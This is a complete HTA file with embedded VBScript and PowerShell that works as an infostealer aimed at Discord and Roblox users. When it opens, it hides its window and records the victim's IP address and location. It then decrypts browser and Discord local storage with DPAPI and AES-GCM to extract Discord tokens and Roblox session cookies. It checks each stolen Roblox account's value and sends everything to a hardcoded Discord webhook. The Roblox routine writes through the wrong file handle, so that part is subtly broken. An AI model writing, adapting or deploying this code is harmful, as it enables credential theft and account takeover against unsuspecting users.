<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH   = "https://discord.com/api/webhooks/1560055014452502561/2U4AKS7_dxuIrHR4l7tcr8pnPfWw-mlrsvlN-tQgoPAJNA8El6WnAEs1UcpMnnj0BA4o"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    IP()
    GrabDiscord()
    GrabRoblox()
End Sub

Sub IP()
    Dim xh, ip, ll, info
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False : xh.Send
    If xh.Status <> 200 Then Exit Sub
    ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False : xh.Send
    If xh.Status <> 200 Then Exit Sub
    ll   = Split(xh.responseText, vbLf)
    info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | USER: " & USER
    PostEmbed "Target", info, 3447003
    Set xh = Nothing
End Sub

Sub GrabDiscord()
    Dim psf, tf, TF
    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dc_g.ps1"
    tf  = sh.ExpandEnvironmentStrings("%TEMP%") & "\dc_r.txt"
    TF  = tf
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If fso.FileExists(tf)  Then fso.DeleteFile tf,  True

    Dim f : Set f = fso.CreateTextFile(psf, True, False)

    f.WriteLine "Add-Type -AssemblyName System.Security"
    f.WriteLine "$gcmOK = $false"
    f.WriteLine "try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
    f.WriteLine "$tokens = New-Object System.Collections.Generic.List[string]"
    f.WriteLine "$seen   = New-Object System.Collections.Generic.HashSet[string]"
    f.WriteLine "function GetMK { param($base)"
    f.WriteLine "    try {"
    f.WriteLine "        $ls = Join-Path $base 'Local State'"
    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
    f.WriteLine "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
    f.WriteLine "    } catch { return $null } }"
    f.WriteLine "function DecGCM { param($mk, $b)"
    f.WriteLine "    if (-not $gcmOK -or $null -eq $mk -or $b.Length -lt 31) { return $null }"
    f.WriteLine "    try {"
    f.WriteLine "        $nonce = [byte[]]$b[3..14]"
    f.WriteLine "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]"
    f.WriteLine "        $ct    = [byte[]]$b[15..($b.Length-17)]"
    f.WriteLine "        $out   = New-Object byte[] $ct.Length"
    f.WriteLine "        $gcm   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)"
    f.WriteLine "        $gcm.Decrypt($nonce, $ct, $tag, $out)"
    f.WriteLine "        $gcm.Dispose()"
    f.WriteLine "        return [System.Text.Encoding]::UTF8.GetString($out)"
    f.WriteLine "    } catch { return $null } }"
    f.WriteLine "function ValidToken { param($t)"
    f.WriteLine "    if (-not $t) { return $false }"
    f.WriteLine "    if ($t -match '^mfa\.[\w-]{84}$') { return $true }"
    f.WriteLine "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }"
    f.WriteLine "    return $false }"
    f.WriteLine "function CheckToken { param($t)"
    f.WriteLine "    try {"
    f.WriteLine "        $wc = New-Object System.Net.WebClient"
    f.WriteLine "        $wc.Headers.Add('Authorization', $t)"
    f.WriteLine "        $wc.Headers.Add('Content-Type', 'application/json')"
    f.WriteLine "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')"
    f.WriteLine "        $wc.Dispose()"
    f.WriteLine "        return ($r -match '""id""')"
    f.WriteLine "    } catch { return $false } }"
    f.WriteLine "function ScanFile { param($path, $mk)"
    f.WriteLine "    try {"
    f.WriteLine "        $bytes = [System.IO.File]::ReadAllBytes($path)"
    f.WriteLine "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)"
    f.WriteLine "        $rx1   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}'"
    f.WriteLine "        foreach ($m in $rx1.Matches($txt)) {"
    f.WriteLine "            try {"
    f.WriteLine "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))"
    f.WriteLine "                $dec = DecGCM $mk $enc"
    f.WriteLine "                if ((ValidToken $dec) -and (CheckToken $dec) -and $seen.Add($dec)) { $tokens.Add($dec) }"
    f.WriteLine "            } catch {} }"
    f.WriteLine "        $rx2 = [regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}'"
    f.WriteLine "        foreach ($m in $rx2.Matches($txt)) {"
    f.WriteLine "            $v = $m.Value"
    f.WriteLine "            if ((ValidToken $v) -and (CheckToken $v) -and $seen.Add($v)) { $tokens.Add($v) } }"
    f.WriteLine "        $rx3 = [regex]'mfa\.[\w-]{84}'"
    f.WriteLine "        foreach ($m in $rx3.Matches($txt)) {"
    f.WriteLine "            $v = $m.Value"
    f.WriteLine "            if ((ValidToken $v) -and (CheckToken $v) -and $seen.Add($v)) { $tokens.Add($v) } }"
    f.WriteLine "    } catch {} }"
    f.WriteLine "function ScanLDB { param($ldb, $mk)"
    f.WriteLine "    if (-not (Test-Path $ldb)) { return }"
    f.WriteLine "    Get-ChildItem $ldb -File -EA SilentlyContinue | Where-Object { $_.Extension -in @('.ldb','.log') } | Sort-Object LastWriteTime -Descending | ForEach-Object { ScanFile $_.FullName $mk } }"
    f.WriteLine "$discordPaths = @("
    f.WriteLine "    (Join-Path $env:APPDATA 'discord'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'discordcanary'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'discordptb'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'discorddevelopment')"
    f.WriteLine ")"
    f.WriteLine "foreach ($base in $discordPaths) {"
    f.WriteLine "    if (-not (Test-Path $base)) { continue }"
    f.WriteLine "    $mk = GetMK $base"
    f.WriteLine "    ScanLDB (Join-Path $base 'Local Storage\leveldb') $mk }"
    f.WriteLine "$browsers = @("
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome SxS\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera GX Stable'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Yandex\YandexBrowser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Chromium\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kometa\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Orbitum\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CentBrowser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Iridium\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA '7Star\7Star\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Sputnik\Sputnik\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Epic Privacy Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'uCozMedia\Uran\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CatalinaGroup\Citrio\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Coowon\Coowon\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'liebao\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Torch\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Comodo\Dragon\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Amigo\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CocCoc\Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kinza\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Maxthon\Application\User Data'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera Stable'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera GX Stable')"
    f.WriteLine ")"
    f.WriteLine "foreach ($br in $browsers) {"
    f.WriteLine "    if (-not (Test-Path $br)) { continue }"
    f.WriteLine "    $mk    = GetMK $br"
    f.WriteLine "    $profs = @('Default') + @(Get-ChildItem $br -Directory -EA SilentlyContinue | Where-Object { $_.Name -match '^Profile' } | Select-Object -ExpandProperty Name)"
    f.WriteLine "    foreach ($p in $profs) { ScanLDB (Join-Path $br ($p + '\Local Storage\leveldb')) $mk } }"
    f.WriteLine "$ffRoots = @("
    f.WriteLine "    (Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'Waterfox\Profiles'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'Pale Moon\Profiles'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'Basilisk\Profiles'),"
    f.WriteLine "    (Join-Path $env:APPDATA 'Thunderbird\Profiles')"
    f.WriteLine ")"
    f.WriteLine "foreach ($root in $ffRoots) {"
    f.WriteLine "    if (-not (Test-Path $root)) { continue }"
    f.WriteLine "    Get-ChildItem $root -Directory -EA SilentlyContinue | ForEach-Object {"
    f.WriteLine "        $lsDir = Join-Path $_.FullName 'local-storage'"
    f.WriteLine "        if (Test-Path $lsDir) { Get-ChildItem $lsDir -File -EA SilentlyContinue | ForEach-Object { ScanFile $_.FullName $null } }"
    f.WriteLine "        $sdDir = Join-Path $_.FullName 'storage\default'"
    f.WriteLine "        if (Test-Path $sdDir) { Get-ChildItem $sdDir -Recurse -File -EA SilentlyContinue | Where-Object { $_.Length -lt 5MB } | ForEach-Object { ScanFile $_.FullName $null } }"
    f.WriteLine "    } }"
    f.WriteLine "if ($tokens.Count -gt 0) { $tokens | Out-File '" & TF & "' -Encoding utf8 }"
    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & TF & "' -Encoding utf8 -NoNewline }"

    f.Close : Set f = Nothing
    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw : raw = Trim(ReadFile(tf))
    If fso.FileExists(tf) Then fso.DeleteFile tf, True
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub
    Dim lines, ln, idx
    lines = Split(raw, vbLf)
    idx = 0
    For Each ln In lines
        ln = Trim(ln)
        If Len(ln) > 10 Then
            idx = idx + 1
            PostFile "discord_token_" & idx & ".txt", ln
        End If
    Next
End Sub

Sub GrabRoblox()
    Dim psf, tf, TF
    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\rblx_g.ps1"
    tf  = sh.ExpandEnvironmentStrings("%TEMP%") & "\rblx_r.txt"
    TF  = tf
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If fso.FileExists(tf)  Then fso.DeleteFile tf,  True

    Dim f2 : Set f2 = fso.CreateTextFile(psf, True, False)

    f.WriteLine "Add-Type -AssemblyName System.Security"
    f.WriteLine "$cookies = New-Object System.Collections.Generic.List[string]"
    f.WriteLine "$seen    = New-Object System.Collections.Generic.HashSet[string]"
    f.WriteLine "function CleanCookie { param($raw)"
    f.WriteLine "    if (-not $raw) { return $null }"
    f.WriteLine "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]"
    f.WriteLine "    $i = $c.IndexOf('_|WARNING')"
    f.WriteLine "    if ($i -gt 0) { $c = $c.Substring($i) }"
    f.WriteLine "    if ($c -match '_\|WARNING|ROBLOSECURITY') { return $c }"
    f.WriteLine "    return $null }"
    f.WriteLine "function AddCookie { param($raw)"
    f.WriteLine "    $c = CleanCookie $raw"
    f.WriteLine "    if ($c -and $seen.Add($c)) { $cookies.Add($c) } }"
    f.WriteLine "function GetMK { param($base)"
    f.WriteLine "    try {"
    f.WriteLine "        $ls = Join-Path $base 'Local State'"
    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
    f.WriteLine "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
    f.WriteLine "    } catch { return $null } }"
    f.WriteLine "function DecGCM { param($mk, $enc)"
    f.WriteLine "    try {"
    f.WriteLine "        $gcmOK = $false"
    f.WriteLine "        try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
    f.WriteLine "        if (-not $gcmOK -or $null -eq $mk -or $enc.Length -lt 31) { return $null }"
    f.WriteLine "        $nonce = [byte[]]$enc[3..14]"
    f.WriteLine "        $tag   = [byte[]]$enc[($enc.Length-16)..($enc.Length-1)]"
    f.WriteLine "        $ct    = [byte[]]$enc[15..($enc.Length-17)]"
    f.WriteLine "        $out   = New-Object byte[] $ct.Length"
    f.WriteLine "        $gcm   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)"
    f.WriteLine "        $gcm.Decrypt($nonce, $ct, $tag, $out)"
    f.WriteLine "        $gcm.Dispose()"
    f.WriteLine "        return [System.Text.Encoding]::UTF8.GetString($out)"
    f.WriteLine "    } catch { return $null } }"
    f.WriteLine "foreach ($rp in @("
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\Cookies'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')"
    f.WriteLine ")) {"
    f.WriteLine "    if (-not (Test-Path $rp)) { continue }"
    f.WriteLine "    try {"
    f.WriteLine "        $raw = [System.IO.File]::ReadAllText($rp)"
    f.WriteLine "        try {"
    f.WriteLine "            $j = $raw | ConvertFrom-Json"
    f.WriteLine "            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {"
    f.WriteLine "                try {"
    f.WriteLine "                    $ek  = [Convert]::FromBase64String($_.Value)"
    f.WriteLine "                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')"
    f.WriteLine "                    AddCookie ([System.Text.Encoding]::UTF8.GetString($dec))"
    f.WriteLine "                } catch {} }"
    f.WriteLine "        } catch {}"
    f.WriteLine "        AddCookie $raw"
    f.WriteLine "    } catch {} }"
    f.WriteLine "$pkgs = Join-Path $env:LOCALAPPDATA 'Packages'"
    f.WriteLine "if (Test-Path $pkgs) {"
    f.WriteLine "    Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {"
    f.WriteLine "        foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {"
    f.WriteLine "            $uwp = Join-Path $_.FullName $fn"
    f.WriteLine "            if (Test-Path $uwp) { try { AddCookie ([System.IO.File]::ReadAllText($uwp)) } catch {} } } } }"
    f.WriteLine "$browsers = @("
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome SxS\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera GX Stable'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Yandex\YandexBrowser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Chromium\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kometa\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Orbitum\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CentBrowser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Iridium\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA '7Star\7Star\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Sputnik\Sputnik\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Epic Privacy Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'uCozMedia\Uran\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Torch\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Comodo\Dragon\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Amigo\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CocCoc\Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kinza\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Maxthon\Application\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\EBWebView\EBWebView'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera Stable'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera GX Stable')"
    f.WriteLine ")"
    f.WriteLine "foreach ($br in $browsers) {"
    f.WriteLine "    if (-not (Test-Path $br)) { continue }"
    f.WriteLine "    $mk    = GetMK $br"
    f.WriteLine "    $profs = @('Default') + @(Get-ChildItem $br -Directory -EA SilentlyContinue | Where-Object { $_.Name -match '^Profile' } | Select-Object -ExpandProperty Name)"
    f.WriteLine "    foreach ($p in $profs) {"
    f.WriteLine "        foreach ($ckName in @('Cookies','Network\Cookies')) {"
    f.WriteLine "            $ckPath = Join-Path $br (Join-Path $p $ckName)"
    f.WriteLine "            if (-not (Test-Path $ckPath)) { continue }"
    f.WriteLine "            $tmp = $ckPath + '.tmp'"
    f.WriteLine "            try {"
    f.WriteLine "                Copy-Item $ckPath $tmp -Force"
    f.WriteLine "                $bytes = [System.IO.File]::ReadAllBytes($tmp)"
    f.WriteLine "                $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)"
    f.WriteLine "                $rx    = [regex]'_\|WARNING[^\s;]+'"
    f.WriteLine "                foreach ($m in $rx.Matches($txt)) { AddCookie $m.Value }"
    f.WriteLine "                Remove-Item $tmp -EA SilentlyContinue"
    f.WriteLine "            } catch { Remove-Item $tmp -EA SilentlyContinue } } } }"
    f.WriteLine "if ($cookies.Count -gt 0) { $cookies | Out-File '" & TF & "' -Encoding utf8 }"
    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & TF & "' -Encoding utf8 -NoNewline }"

    f2.Close : Set f2 = Nothing
    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw : raw = Trim(ReadFile(tf))
    If fso.FileExists(tf) Then fso.DeleteFile tf, True
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub
    Dim lines, ln, idx
    lines = Split(raw, vbLf)
    idx = 0
    For Each ln In lines
        ln = Trim(ln)
        If Len(ln) > 10 Then
            idx = idx + 1
            PostFile "roblox_cookie_" & idx & ".txt", ln
            GrabRobloxInfo ln, idx
        End If
    Next
End Sub

Sub GrabRobloxInfo(cookie, idx)
    Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
    json    = xh.responseText
    uid     = RegexFirst(json, """UserID"":(\d+)")
    uname   = RegexFirst(json, """UserName"":""([^""]+)""")
    robux   = RegexFirst(json, """RobuxBalance"":(\d+)")
    premium = RegexFirst(json, """IsPremium"":(true|false)")
    If uid = "" Then Set xh = Nothing : Exit Sub
    If robux   = "" Then robux   = "0"
    If premium = "" Then premium = "false"
    xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
    xh.Send
    ageDays = "?"
    If xh.Status = 200 Then
        uinfo   = xh.responseText
        created = RegexFirst(uinfo, """created"":""([^T]+)")
        If created <> "" Then
            On Error Resume Next
            createdDate = CDate(created)
            If Err.Number = 0 Then ageDays = CStr(DateDiff("d", createdDate, Now()))
            On Error GoTo 0
        End If
    End If
    rapVal = "0"
    xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status = 200 Then
        Dim rapJson : rapJson = xh.responseText
        Dim rapSum  : rapSum  = 0
        Dim pos     : pos     = 1
        Dim key     : key     = """recentAveragePrice"":"
        Dim p, numStr, ch
        Do
            p = InStr(pos, rapJson, key)
            If p = 0 Then Exit Do
            p = p + Len(key)
            numStr = ""
            Do While p <= Len(rapJson)
                ch = Mid(rapJson, p, 1)
                If ch >= "0" And ch <= "9" Then numStr = numStr & ch : p = p + 1
                Else Exit Do
                End If
            Loop
            If numStr <> "" Then rapSum = rapSum + CLng(numStr)
            pos = p
        Loop
        rapVal = CStr(rapSum)
    End If
    Set xh = Nothing
    Dim nl : nl = Chr(10)
    Dim embedDesc
    embedDesc = "**Username** | **Age** | **PC**" & nl
    embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
    embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
    embedDesc = embedDesc & robux & " | " & premium & " | " & rapVal & nl & nl
    embedDesc = embedDesc & "**Cookie**" & nl
    embedDesc = embedDesc & "``roblox_cookie_" & idx & ".txt``"
    PostEmbed "Roblox Hit #" & idx, embedDesc, 16711680
End Sub

Function RegexFirst(src, pattern)
    Dim rx : Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern = pattern
    rx.IgnoreCase = True
    Dim m : Set m = rx.Execute(src)
    If m.Count > 0 Then
        If m(0).SubMatches.Count > 0 Then RegexFirst = m(0).SubMatches(0)
        Else RegexFirst = m(0).Value
        End If
    Else
        RegexFirst = ""
    End If
    Set rx = Nothing
End Function

Function ReadFile(p)
    Dim f : Set f = fso.OpenTextFile(p, 1) : ReadFile = f.ReadAll : f.Close : Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    Dim DQ, j, h
    DQ = Chr(34)
    j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    Dim DQ, b, bd, h
    DQ = Chr(34)
    b  = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    bd = "--" & b & vbCrLf & _
         "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
         ct & vbCrLf & "--" & b & "--"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function
</script>
</head><body></body></html>
